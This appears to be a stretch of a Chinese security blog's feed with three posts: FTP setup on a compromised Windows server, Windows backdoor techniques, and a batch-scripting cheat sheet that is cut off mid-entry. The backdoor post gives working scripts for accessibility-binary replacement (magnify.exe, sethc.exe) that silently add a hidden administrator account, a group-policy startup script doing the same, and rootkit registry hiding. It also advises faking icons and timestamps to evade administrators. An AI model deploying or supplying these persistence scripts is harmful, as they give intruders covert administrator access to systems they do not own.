    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>在渗透中如果我们想传输一些东西，我想FTP就是其中的比较好的选择之一，本文就是我在测试Windows Server 2008 R2 搭建 ftp 服务器中的一些步骤以及踩坑记录。</p><span id="more"></span><h2 id="0X01-搭建好IIS"><a href="#0X01-搭建好IIS" class="headerlink" title="**0X01 搭建好IIS **"></a>**0X01 搭建好IIS **</h2><p>当然，一般对于你所渗透的winwows 服务器来说，IIS 肯定已经搭建好了，不过为了完整性我还是要说一下。</p><p>首先，打开服务器管理器面板，点击角色，选择屏幕右边的添加角色，添加IISS服务器<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP1.png" alt="此处输入图片的描述"></p><p>点击下一步，再选中FTP服务器</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP2.png" alt="此处输入图片的描述"></p><p>接着一路默认，点击安装就安装好了FTP服务</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP3.png" alt="此处输入图片的描述"></p><h2 id="0X02-添加FTP服务器"><a href="#0X02-添加FTP服务器" class="headerlink" title="0X02 添加FTP服务器"></a><strong>0X02 添加FTP服务器</strong></h2><p>在管理工具中找到IIS服务器管理，右键添加FTP站点（其实正常我们应该另外创建一个FTP用户组和用户的，但是由于我这篇文章是针对入侵过程，所以我觉得就没有必要留下更多的痕迹）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP4.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP5.png" alt="此处输入图片的描述"></p><p>选择你想使用的FTP目录的路径（我这里选择的是C盘），当你选择了以后，你的所有操作都是针对这个范围的，所以一定要包含你想要传输的数据。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP6.png" alt="此处输入图片的描述"></p><p>IP地址就是FTP服务器的地址</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP7.png" alt="此处输入图片的描述"></p><p>这里启动基本验证，并只允许某一个用户登录FTP服务器（请根据实际情况进行选择），并给他读写权限</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP8.png" alt="此处输入图片的描述"></p><p>启动基本验证就要在配置中允许</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP11.png" alt="此处输入图片的描述"></p><h2 id="0X03-权限控制"><a href="#0X03-权限控制" class="headerlink" title="0X03 权限控制"></a><strong>0X03 权限控制</strong></h2><p>后面的步骤就比较重要了，能够决定着你能不能成功访问FTP服务器</p><p>首先你必须保证防火墙的入站规则允许了FTP服务</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP9.png" alt="此处输入图片的描述"></p><p>然后这一步就是一个巨大的坑。。。。。。。。。你会发现你本地能登录FTP服务器，但是远程就是超时</p><p>打开“控制面板”–“Windows防火墙”，点击左边的“允许程序或功能通过Windows防火墙”，在新窗口中点击“允许运行另一程序”。在浏览中找到“C:\Windows\System32\svchost.exe”，打开并添加。这时候会多出一项“Windows服务主进程”，勾选后面的两个复选框，如下图。完成后确认。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP10.png" alt="此处输入图片的描述"></p><p>我们访问一下看看,可以看到已经成功了</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP12.png" alt="此处输入图片的描述"></p><h2 id="0X04-介绍FTP的两种访问模式"><a href="#0X04-介绍FTP的两种访问模式" class="headerlink" title="0X04 介绍FTP的两种访问模式"></a>0X04 介绍FTP的两种访问模式</h2><h3 id="（1）主动模式-———–-服务器主动连接客户端传输数据"><a href="#（1）主动模式-———–-服务器主动连接客户端传输数据" class="headerlink" title="（1）主动模式 ———–&gt; 服务器主动连接客户端传输数据"></a><strong>（1）主动模式 ———–&gt; 服务器主动连接客户端传输数据</strong></h3><p><strong>概念：</strong><br>客户端先和服务端的21端口建立连接，并提供一个待会自己要进行数据传输的端口，服务端20端口待会就根据客户端指定的端口与客户端主动建立连接</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/FTPMODE1.jpg" alt="此处输入图片的描述"></p><p><strong>优缺点：</strong></p><p>主动FTP对FTP服务器的管理有利，但对客户端的管理不利。因为FTP服务器企图与客户端的高位随机端口建立连接，而这个端口很有可能被客户端的防火墙阻塞掉。</p><h3 id="（2）被动模式-————-服务器等待客户端的连接，然后传输数据"><a href="#（2）被动模式-————-服务器等待客户端的连接，然后传输数据" class="headerlink" title="（2）被动模式 ————&gt; 服务器等待客户端的连接，然后传输数据"></a><strong>（2）被动模式 ————&gt; 服务器等待客户端的连接，然后传输数据</strong></h3><p><strong>概念：</strong></p><p>客户端先和服务端的21端口建立连接，然后服务端提供一个自己可以进行数据传输的端口给客户端（不一定是20），客户端就会用自己的端口与这个端口建立连接进行传输数据</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/FTPMODE2.jpg" alt="此处输入图片的描述"></p><p><strong>优缺点：</strong></p><p>被动FTP对FTP客户端的管理有利，但对服务器端的管理不利。因为客户端要与服务器端建立两个连接，其中一个连到一个高位随机端口，而这个端口很有可能被服务器端的防火墙阻塞掉。</p><h2 id="0X05-介绍-ASCII-和-Binary-模式的区别"><a href="#0X05-介绍-ASCII-和-Binary-模式的区别" class="headerlink" title="0X05 介绍 ASCII 和 Binary 模式的区别"></a>0X05 介绍 ASCII 和 Binary 模式的区别</h2><p>由于类 Unix 系统和 windows 系统的换行是不同的，UNIX 系统的换行是0A 而 Windows 系统的换行是0D0A，因此两者的文件在传输的时候要注意</p><p>（1）传输文件的时候最好使用ASCII模式</p><p>这样就能兼容unix 和 linux 两种模式</p><p>（2） </p><h2 id="0X06-介绍几种访问FTP的方法"><a href="#0X06-介绍几种访问FTP的方法" class="headerlink" title="0X06 介绍几种访问FTP的方法"></a>0X06 介绍几种访问FTP的方法</h2><p>1.使用专业的工具，如上面的演示所示，我使用的是专业的FTP工具连接，很方便快捷</p><p>2.使用浏览器直接连接，如下图</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP13.png" alt="此处输入图片的描述"></p><p>3.纯命令行</p><p><strong>(1)连接ftp :</strong></p><pre><code class="hljs">FTP 192.168.71.131</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP14.png" alt="此处输入图片的描述"></p><p><strong>(2) lcd 定位本地文件夹</strong><br>我们需要选择我们本地的文件夹用来确定要将文件下载到什么地方或者要上传的文件在什么地方</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP15.png" alt="此处输入图片的描述"></p><p><strong>(3) 使用命令进行文件的上传和下载</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP16.png" alt="此处输入图片的描述"></p><p><strong>注：文件上传和下载都是在服务器的默认目录下</strong></p><p>1）put 文件上传</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP17.png" alt="此处输入图片的描述"></p><p>2）get 文件下载</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/WINFTP18.png" alt="此处输入图片的描述"></p><h2 id="0X07-参考链接："><a href="#0X07-参考链接：" class="headerlink" title="0X07 参考链接："></a>0X07 参考链接：</h2><p><a href="https://www.cnblogs.com/john2017/p/6269671.html">https://www.cnblogs.com/john2017/p/6269671.html</a><br><a href="https://www.cnblogs.com/tonybuaa/p/config_firewall_for_windows_server_2008_ftp.html">https://www.cnblogs.com/tonybuaa/p/config_firewall_for_windows_server_2008_ftp.html</a><br><a href="https://www.cnblogs.com/ajianbeyourself/p/7655464.html">https://www.cnblogs.com/ajianbeyourself/p/7655464.html</a><br><a href="https://blog.csdn.net/loomman/article/details/7877003">https://blog.csdn.net/loomman/article/details/7877003</a></p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows FTP搭建 备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows 常见后门添加方法再探究</title>
    <link href="/2018/07/29/Windows%20%E5%B8%B8%E8%A7%81%E5%90%8E%E9%97%A8%E6%B7%BB%E5%8A%A0%E6%96%B9%E6%B3%95%E5%86%8D%E6%8E%A2%E7%A9%B6/"/>
    <url>/2018/07/29/Windows%20%E5%B8%B8%E8%A7%81%E5%90%8E%E9%97%A8%E6%B7%BB%E5%8A%A0%E6%96%B9%E6%B3%95%E5%86%8D%E6%8E%A2%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>之前写过一篇关于windows 影子账户的添加方法的文章，这其实只是一种最简单的方式，这种方式只能允许你进入Windows之后手动添加，万一被聪明的管理员发现并删除了，并且又改了登录密码就会非常之难受，于是又参考了一些文章，想再补充一下后门木马的建立方式，并对我之前的那个影子账户作进一步的升级。</p><span id="more"></span><h2 id="0X01-后门是什么"><a href="#0X01-后门是什么" class="headerlink" title="0X01 后门是什么"></a><strong>0X01 后门是什么</strong></h2><p>其实后门这个词非常的形象，如果说把服务器看成是一个房间，管理员每次都是根据口令从正门进去的话，后门就是入侵者在入侵以后悄悄挖的地道（可能在床底下，可能在衣柜里，反正就是不让管理员发现），目的也很明确，就是入侵者希望绕过正门，从自己挖的地道进去。</p><h2 id="0X02-后门的本质"><a href="#0X02-后门的本质" class="headerlink" title="0X02 后门的本质"></a><strong>0X02 后门的本质</strong></h2><p>记得在我的上一篇文章<a href="http://www.k0rz3n.com/2018/06/26/windows%E6%B8%97%E9%80%8F%E4%B8%AD%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/">windows渗透中后门用户的添加方法探究 </a>中我说过，后门的本质就是添加用户（<strong>是在未登录的情况下添加</strong>）没有用户是不可能登录进去的，所以接下来我所有的操作都是以这个为目标的。</p><h2 id="0X03-放大镜后门"><a href="#0X03-放大镜后门" class="headerlink" title="0X03 放大镜后门"></a><strong>0X03 放大镜后门</strong></h2><p>别被名字误导了，不是这个后门能实现放大镜的作用，而是我们要利用放大镜这个能<strong>在未登录的情况下</strong>使用快捷方式运行的应用程序来创建我们的用户，从而达到入侵的目的。</p><h3 id="1-基本原理"><a href="#1-基本原理" class="headerlink" title="1.基本原理"></a><strong>1.基本原理</strong></h3><p>放大镜在windows系统中的应用程序名称为 magnify.exe，在Windows系统未登录的时候使用 Win+U就能调用出来，我们会使用我们精心构造的magnify.exe的同名文件替换系统本身的放大镜程序（这个同名文件是由我们自己编写的bat脚本转化成exe实现的）。我们的这个文件的功能就是添加用户并且能在最后打开放大镜，避免引起管理员使用时的怀疑。</p><h3 id="2-脚本编写"><a href="#2-脚本编写" class="headerlink" title="2.脚本编写"></a><strong>2.脚本编写</strong></h3><p>因为现在主流的系统都是64位的，所以我们就替换我们system32目录下的就可以了</p><p>replacement.bat</p><pre><code class="hljs">@echo offcopy %Windir%\system32\magnify.exe nagnify.exe ::备份原始放大镜程序，以备后面调用replace.exe %Windir%\magnify.exe %Windir%\system32 ::将自己的程序伪装成放大镜程序exit </code></pre><p><strong>（以上脚本只是提供一个思路，我个人测试过程中发现这个脚本的运行会受到权限的严重限制，导致没法成功实现replace功能，最好的方法就是在获取system32中的mangify.exe 的管理员权限以后直接手动复制和粘贴）<br>右键获取管理员权限需要通过修改注册表实现，以下就是提升权限的脚本</strong></p><p>promote.reg</p><pre><code class="hljs">Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\*\shell\runas]@=&quot;管理员取得所有权&quot;&quot;NoWorkingDirectory&quot;=&quot;&quot;[HKEY_CLASSES_ROOT\*\shell\runas\command]@=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;&quot;IsolatedCommand&quot;=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;[HKEY_CLASSES_ROOT\exefile\shell\runas2]@=&quot;管理员取得所有权&quot;&quot;NoWorkingDirectory&quot;=&quot;&quot;[HKEY_CLASSES_ROOT\exefile\shell\runas2\command]@=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;&quot;IsolatedCommand&quot;=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;[HKEY_CLASSES_ROOT\Directory\shell\runas]@=&quot;管理员取得所有权&quot;&quot;NoWorkingDirectory&quot;=&quot;&quot;[HKEY_CLASSES_ROOT\Directory\shell\runas\command]@=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; /r /d y &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F /t&quot;&quot;IsolatedCommand&quot;=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; /r /d y &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F /t&quot;</code></pre><p>magnify.bat</p><pre><code class="hljs">@echo offnet user admin$ admin_888 /add  2&gt;nulnet localgroup administrators admin$ /add 2&gt;nul //创建用户start %Windir%\system32\nagnify.exe 2&gt;nul //调用真正的放大镜以防露出破绽exit </code></pre><h3 id="3-注意"><a href="#3-注意" class="headerlink" title="3.注意"></a><strong>3.注意</strong></h3><p>1.这里的 2&gt;nul 是将错误输出屏蔽<br>2.这里的转换工具推荐使用 bat to exe 这个工具，按照原来的逻辑就是使用工具将上面的bat脚本转化成exe文件，放在该放的位置，然后等我们运行放大镜就行了。<br>3.为了更好地隐藏我们需要提取系统原有的图标，然后在转化成 exe文件的时候爆把这个图标也选择上。（这里的提取工具推荐iconmaster）<br>4.由于我们的代码比较少， 加上图标也只有500多K,而原始程序有600多K，我们甚至为了隐藏更加彻底添加一些冗余代码。<br>5.还有一个非常重要的东西就是修改时间，改成系统原始的时间（推荐工具 NewFileTime_x64）</p><h3 id="4-攻击流程"><a href="#4-攻击流程" class="headerlink" title="4.攻击流程"></a><strong>4.攻击流程</strong></h3><p>（1）备份magnify.exe 为 nagnify.exe 到当前目录下<br>（2）将我们的添加用户和调用备份的放大镜程序的bat脚本转化成magnify.exe文件(要转化成64位的否则会无法执行)，然后替换原来的system32下的magnify.exe<br>（3）运行magnify.exe 即可完成添加用户和打开放大镜的操作</p><h2 id="0X04-Shift后门"><a href="#0X04-Shift后门" class="headerlink" title="0X04 Shift后门"></a><strong>0X04 Shift后门</strong></h2><p>shift 后门和放大镜后门是一样的操作，只是文件替换变化成了setch.exe（这个更加隐蔽一些）</p><h2 id="0X05-组策略后门"><a href="#0X05-组策略后门" class="headerlink" title="0X05 组策略后门"></a><strong>0X05 组策略后门</strong></h2><h3 id="1-什么是组策略"><a href="#1-什么是组策略" class="headerlink" title="1.什么是组策略"></a><strong>1.什么是组策略</strong></h3><p>我们知道，注册表时每个windows系统的灵魂，他统筹管理着windows系统的一切配置，没有了注册表系统就是一块废铁，你什么文件也打不开。组策略是windows专业版以上拥有的一个快速管理注册表的工具，是管理员管理系统的强大的工具（当然也是黑客留后门的强有力手段）。</p><h3 id="2-组策略作用"><a href="#2-组策略作用" class="headerlink" title="2.组策略作用"></a><strong>2.组策略作用</strong></h3><p>组策略对本地计算机可以进行两个方面的设置：本地计算机配置和本地用户配置。所有策略的设置都将保存到注册表的相关项目中。对计算机策略的设置保存到注册表的HKEY_LOCAL_MACHINE的相关项中，对用户的策略设置将保存到HKEY_CURRENT_USER相关项中。</p><p>例如，可使用“组策略”从桌面删除图标、自定义“开始”菜单并简化“控制面板”。此外,还可添加在计算机上（在计算机启动或停止时，以及用户登录或注销时）运行的脚本，甚至可配置Internet Explorer。</p><h3 id="3-组策略开启"><a href="#3-组策略开启" class="headerlink" title="3.组策略开启"></a><strong>3.组策略开启</strong></h3><p>运行中输入 gpedit.msc</p><p>开启后，我们能看到一个是计算机配置，另一个是用户配置，计算机配置是针对所有用户的但是用户配置是针对当前用户。</p><h3 id="4-如何添加后门"><a href="#4-如何添加后门" class="headerlink" title="4.如何添加后门"></a><strong>4.如何添加后门</strong></h3><p>因为组策略能够修改注册表，随系统启动而运行，还能设置开关机启动项，让程序在关机的时候运行，这样的操作更加难以被发现，即使是管理员以为自己删除了木马，一旦他关机，木马又会被激活。</p><p>设置的地点在 组策略 &gt; 计算机配置 &gt; windows 设置 &gt; 脚本（启动、关机）</p><p>编写脚本a.bat用来创建隐藏账户</p><pre><code class="hljs">@echo offnet user admin$ admin_888 /add  2&gt;nulnet localgroup administrators admin$ /add 2&gt;nul //创建用户</code></pre><h3 id="5-如何防范"><a href="#5-如何防范" class="headerlink" title="5.如何防范"></a><strong>5.如何防范</strong></h3><p>多多关注开关机启动项：</p><p>system32\GroupPolicy\Machine\Scripts\Startup 和system32\GroupPolicy\Machine\Scripts\Shutdown目录看看有没有可疑的脚本</p><h2 id="0X06-rootkit-后门"><a href="#0X06-rootkit-后门" class="headerlink" title="0X06 rootkit 后门"></a><strong>0X06 rootkit 后门</strong></h2><h3 id="1-rootkit-是什么"><a href="#1-rootkit-是什么" class="headerlink" title="1.rootkit 是什么"></a><strong>1.rootkit 是什么</strong></h3><p>在悬念迭起的中外谍战片里，对战双方中的一派势力通常会派遣特工人员潜伏到对手阵营中。这名卧底人员良好的伪装使得对手对此长时间毫无察觉；为了能够长期潜伏他不贸然采取高风险行为以免过早暴露自己；他赢得敌人的信任并因此身居要职，这使得他能够源源不断地获取重要情报并利用其独特渠道传送回去。</p><p>从某种意义上说这位不速之客就是Rootkit——持久并毫无察觉地驻留在目标计算机中，对系统进行操纵、并通过隐秘渠道收集数据的程序。Rootkit的三要素就是：隐藏、操纵、收集数据。（以上来源于百度百科）</p><h3 id="2-常见的例子"><a href="#2-常见的例子" class="headerlink" title="2.常见的例子"></a><strong>2.常见的例子</strong></h3><p>在我的前面的一篇文章 <a href="http://www.k0rz3n.com/2018/06/26/windows%E6%B8%97%E9%80%8F%E4%B8%AD%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/">windows渗透中后门用户的添加方法探究 </a>我其实已经介绍了两种方法，一个就是创建admin$ 这种使用命令行看不出来的用户，另一种就是使用影子账户这种只能在注册表中看到的用户，但是现在我们可以对其进行更进一步的升级。</p><p>使用rootkit工具可以实现在注册表中也能隐藏，而且这种隐藏是很难被发现的，除非使用特别的查杀工具<br>我们隐藏注册表键值只需其中的两个文件， hxdef100.exe和 hxdef100.ini。其中 hxdef100.ini 是配置文件，hxdef100.exe 是程 序文件。打开 hxdef100.ini 文件定位到 [HiddenRegKeys]项下，添加我们要隐藏的 注册表键值 admin$和 000003EF即用户在注册表的项然后保存退出。 然后双击运行 hxdef100.exe，可以看到 admin$用户在注册表中的键值 “消失” 了，同时这两个文件也 “不见”了。这样我们就利用 RootKit 实现了高级管理员用 户的彻底隐藏，管理员是无从知晓在系统中存在一个管理员用户的。</p><p>（经过我的实验，应该是由目前的操作系统版本更新的原因，原来的老的工具已经不再适用，如果有其他的类似工具，希望各位师傅们不吝赐教）</p><h3 id="3-防范"><a href="#3-防范" class="headerlink" title="3.防范"></a><strong>3.防范</strong></h3><p>rootkit 是驱动级的后门，通过肉眼查杀相对比较困难，推荐大家使用工具来实现</p><h2 id="0X07-Telnet-后门"><a href="#0X07-Telnet-后门" class="headerlink" title="**0X07 Telnet 后门 **"></a>**0X07 Telnet 后门 **</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a><strong>1.简介</strong></h3><p>telnet 是一个命令行下的远程管理工具，这个服务的默认端口是23，但是由于其传输的明文性，windows命令行的不实用性，致使大多数管理员都不采用这种方式来远程管理服务器，而是转向了更为方便直观的3389 也就是远程桌面来管理远程服务器。但是对于黑客来讲命令行什么的都是小事情，关键是这种方式要比直接用3389登录隐蔽的多。</p><p>但是管理员也不傻，正常的管理员都应该知道23端口对应的是telnet，如果哪天管理员无意间发现23端口打开了，那么很容易就会联想到自己的服务器被黑客入侵了。因此我们想要隐藏就必须要将这个默认的端口修改成一个比较随意的端口。</p><h3 id="2-开启方式"><a href="#2-开启方式" class="headerlink" title="2.开启方式"></a><strong>2.开启方式</strong></h3><p>我以 windows server 2008 r2 为例说一下telnet的开启方式</p><p>1）开始 &gt; 管理工具 &gt; 服务器管理 &gt; 功能 &gt; 添加功能勾选 telnet 服务端和客户端<br>2）开始 &gt; 管理工具 &gt; 服务器管理 &gt; 配置 &gt; 高级安全windows防火墙 &gt; 入站规则 允许telnet 访问<br>3）开始 &gt; 管理工具 &gt; 服务器管理 &gt; 配置 &gt; 服务 开启telnet </p><p>完成这三部就基本大功告成了<br>检测方法：命令行输入 netstat -ano 看一下是不是23端口正在监听</p><p>如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/telnet1.png" alt="此处输入图片的描述"></p><h3 id="3-修改端口"><a href="#3-修改端口" class="headerlink" title="3.修改端口"></a><strong>3.修改端口</strong></h3><p>直接在服务器上修改</p><pre><code class="hljs">tlntadmn config port=800</code></pre><p>再检查一下端口，如下图可以看到已经变成了800</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/telnet2.png" alt="此处输入图片的描述"></p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a><strong>注意：</strong></h3><p>到现在为止你依然无法通过800端口实现telnet 的连接，因为windows 2008 server r2 是有防火墙的，我们必须要新建一个入站策略才能实现登陆</p><p>Windows 防火墙 &gt; 入站规则 &gt; 新建规则 &gt; 自定义 &gt; 所有程序 &gt; TCP、特定端口、800 &gt; 其它默认</p><p>接着我们就能通过 800 端口连接服务器的telnet 了</p><h2 id="0X08-嗅探后门"><a href="#0X08-嗅探后门" class="headerlink" title="0X08 嗅探后门"></a><strong>0X08 嗅探后门</strong></h2><p>这种后门并不会创建账号，而是在服务器上安装一个嗅探程序，不定期的向远程的黑客发送服务器的信息，包括管理员的账号密码等敏感信息，由于不添加用户，隐蔽性强，不容易被发现。</p><p>这种后门想要检测，只能通过专业的检测工具或者审查安全日志来查看有没有可疑的登录记录</p><h2 id="0X09-总结"><a href="#0X09-总结" class="headerlink" title="0X09 总结"></a><strong>0X09 总结</strong></h2><p>我参考的文章由于年代比较老旧，经过我的测试只有部分的功能能够成功实现，还有很多由于工具与系统的不兼容已经失效，但是还是能给我们系统一些好的思路和技巧，工具还可以再开发的嘛。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试 windows 后门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>批处理文件编写整理</title>
    <link href="/2018/07/25/%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99%E6%95%B4%E7%90%86/"/>
    <url>/2018/07/25/%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>虽然感觉这个bat脚本用处不大，但是在windows渗透中有些东西还是需要用到这个小工具，最起码看懂是需要的吧，于是我总结了一些常见的语法，并按照难度将其分为初级、中级和高级，并有一些简单的示例代码，算是备忘吧，也分享出来供大家参考</p><span id="more"></span><h2 id="系统参数"><a href="#系统参数" class="headerlink" title="系统参数"></a>系统参数</h2><p>%SystemRoot% &#x3D;&#x3D;&#x3D; %Windir% &#x3D;&#x3D;&#x3D; C:\WINDOWS<br>%ProgramFiles% &#x3D;&#x3D;&#x3D; C:\Program<br>%USERPROFILE% &#x3D;&#x3D;&#x3D; C:\Users\xxxx<br>%APPDATA% &#x3D;&#x3D;&#x3D; C:\Users\XXXX\AppData\Roaming<br>%TEMP% &#x3D;&#x3D;&#x3D; C:\Users\xxxx\AppData\Local\Temp<br>%OS% &#x3D;&#x3D;&#x3D; Windows_NT<br>%PATH% &#x3D;&#x3D;&#x3D; 系统的环境变量<br>%HOMEDRIVE% &#x3D;&#x3D;&#x3D; 系统盘<br>%HOMEPATH% &#x3D;&#x3D;&#x3D; 当前的用户根路径的目录位置</p><h2 id="常用的语法："><a href="#常用的语法：" class="headerlink" title="常用的语法："></a>常用的语法：</h2><h3 id="初阶"><a href="#初阶" class="headerlink" title="初阶"></a><strong>初阶</strong></h3><p>1.echo 输出后面的字符</p><p>2.echo off 其后面的命令都不回显</p><p>3.@ 其后面的命令都不回显（只针对一行）</p><p>4.%[0-9] 参数格式化占位符 %0表示命令本身 %1 表示第一个参数</p><p>5.call 调用另一个bat 程序</p><p>6.pause 暂停</p><p>7.rem 其后面的字符为注释（有些如管道或者重定向还是会执行）</p><p>8.del 删除其后跟着的文件（&#x2F;q 表示安静删除，不请求确认）</p><p>9.:: 其后面的字符为注释 （在任何情况下都不会执行，等同于冒号+空格）</p><p>10.设置变量的时候&#x3D;两边都不能有空格</p><p>11.变量的引用表达形式：%变量名%</p><p>12.cls 清屏命令</p><p>13.？代表单个字符，*代表所有字符</p><p>14.^代表转义字符<br>echo 通配符^&amp;批处理<br>连字符&amp;在此命令中只当作一个字符显示到屏幕中，如果不加^ 那么”批处理”将被当作命令执行</p><p>15.|管道符，将前面的输出作为后面的输入</p><pre><code class="hljs">echo 0123456 | find &quot;123&quot; </code></pre><p>16.|| 连接符<br>前面的命令执行不成功才会执行后面的命令</p><pre><code class="hljs">echo 0123456 | find &quot;789&quot; || echo 字符中没有789</code></pre><p>17.&amp;&amp; 连接符</p><p>前面的命令执行成功才会执行后面的命令</p><pre><code class="hljs">echo 0123456 | find &quot;123&quot; &amp;&amp; echo 字符中含有123</code></pre><p>18.&amp;连接符</p><p>不论前面的命令是否执行成功后面的命令都能执行</p><pre><code class="hljs">echo 0123456 | find &quot;789&quot; &amp; echo 字符中含有123</code></pre><p>19.&lt; 输入定向符</p><pre><code class="hljs">echo 456&gt;1.txtset /p wind=&lt;1.txt</code></pre><p>20.求模  </p><pre><code class="hljs">set /p a=10%%2echo %a%</code></pre><p>21.有一个特别注意的地方就是在for 循环的时候我们 do () 中  do 和后面的括号中间要有一个空格，没有空格就是语法错误</p><p>22.errorlevel 显示程序的返回码</p><p>程序执行完成后都会有一个返回码，成功为1不成功为0</p><p>23.mode 配置系统设备</p><pre><code class="hljs">mode con cols=113 lines=15 &amp; color 9f</code></pre><p>此命令设置DOS窗口大小：15行，113列</p><p>24.start 命令（两者同时运行）</p><p>批处理中调用外部程序的命令（该外部程序在新窗口中运行，批处理程序继续往下执行，不理会外部程序的运行状况），如果直接运行外部程序则必须等外部程序完成后才继续执行剩下的指令</p><pre><code class="hljs">例：start explorer d:\</code></pre><p>调用图形界面打开D盘</p><p>25.color</p><p>设置默认的控制台前景和背景颜色。<br>COLOR [attr]<br>  attr        指定控制台输出的颜色属性<br>颜色属性由两个十六进制数字指定 – 第一个为背景，第二个则为<br>前景。每个数字可以为以下任何值之一:</p><pre><code class="hljs">    0 = 黑色       8 = 灰色    1 = 蓝色       9 = 淡蓝色    2 = 绿色       A = 淡绿色    3 = 湖蓝色     B = 淡浅绿色    4 = 红色       C = 淡红色    5 = 紫色       D = 淡紫色    6 = 黄色       E = 淡黄色    7 = 白色       F = 亮白色    </code></pre><p>如果没有给定任何参数，该命令会将颜色还原到 CMD.EXE 启动时<br>的颜色。这个值来自当前控制台窗口、&#x2F;T 开关或<br>DefaultColor 注册表值。<br>如果用相同的前景和背景颜色来执行 COLOR 命令，COLOR 命令<br>会将 ERRORLEVEL 设置为 1。<br>例如: “COLOR fc” 在亮白色上产生亮红色</p><p>26.<strong>assoc 和 ftype</strong></p><pre><code class="hljs">文件关联assoc 设置&#39;文件扩展名&#39;关联，关联到&#39;文件类型&#39;ftype 设置&#39;文件类型&#39;关联，关联到&#39;执行程序和参数&#39;当你双击一个.txt文件时，windows并不是根据.txt直接判断用 notepad.exe 打开而是先判断.txt属于 txtfile &#39;文件类型&#39;再调用 txtfile 关联的命令行 txtfile=%SystemRoot%\system32\NOTEPAD.EXE %1可以在&quot;文件夹选项&quot;→&quot;文件类型&quot;里修改这2种关联assoc           #显示所有&#39;文件扩展名&#39;关联assoc .txt      #显示.txt代表的&#39;文件类型&#39;，结果显示 .txt=txtfileassoc .doc      #显示.doc代表的&#39;文件类型&#39;，结果显示 .doc=Word.Document.8assoc .exe      #显示.exe代表的&#39;文件类型&#39;，结果显示 .exe=exefileftype           #显示所有&#39;文件类型&#39;关联ftype exefile   #显示exefile类型关联的命令行，结果显示 exefile=&quot;%1&quot; %* assoc .txt=Word.Document.8设置.txt为word类型的文档，可以看到.txt文件的图标都变了assoc .txt=txtfile恢复.txt的正确关联ftype exefile=&quot;%1&quot; %*恢复 exefile 的正确关联如果该关联已经被破坏，可以运行 command.com ，再输入这条命令</code></pre><p>27.<strong>pushd 和 popd</strong><br>切换当前目录</p><pre><code class="hljs">@echo offc: &amp; cd\ &amp; md mp3       #在 C:\ 建立 mp3 文件夹md d:\mp4               #在 D:\ 建立 mp4 文件夹cd /d d:\mp4            #更改当前目录为 d:\mp4pushd c:\mp3            #保存当前目录，并切换当前目录为 c:\mp3popd                    #恢复当前目录为刚才保存的 d:\mp4</code></pre><p>一般用处不大，在当前目录名不确定时，会有点帮助。（dos编程中很有用）</p><p>28.ATTRIB  显示或更改文件属性</p><pre><code class="hljs">ATTRIB [+R|-R] [+A|-A] [+S|-S] [+H|-H] [[drive:] [path] filename] [/S [/D]]  +   